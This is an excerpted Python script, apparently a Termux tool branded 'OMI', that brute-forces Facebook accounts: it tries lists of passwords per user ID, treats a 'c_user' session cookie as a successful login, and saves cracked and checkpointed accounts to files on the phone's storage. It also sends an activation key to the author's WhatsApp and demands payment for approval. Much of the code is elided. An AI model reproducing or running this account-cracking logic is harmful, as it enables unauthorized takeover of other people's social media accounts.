...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/01406115895?text=' + tks)
    ...
    if key1 in r1:
        ...
        print ("         ༄OMI᭄•───────────────────────────────────────•༄VAU᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL OMI")     
        ...
        os.system('am start https://wa.me/0146115895?text=' + tks)
...
logo="""
        ...
        \033[1;92m༄OMI᭄•───────────────────────────────────────•༄VAU᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : OMI HASAN        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : DARK DEVIL OMI         \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : DEVIL OMI         \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : 01406115895    \033[1;93m▇▇
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/OMI-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/OMI-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : OMI-VAU")
			print ('\033[1;92m༄OMI᭄•───────────────────────────────────────•༄VAU᭄')
			key = input(" [*] Choose : ")
			print ('༄OMI᭄•───────────────────────────────────────•༄VAU᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[OMI]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/OMI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/OMI_CP.txt' , 'a').write('%s\n' % wrt)
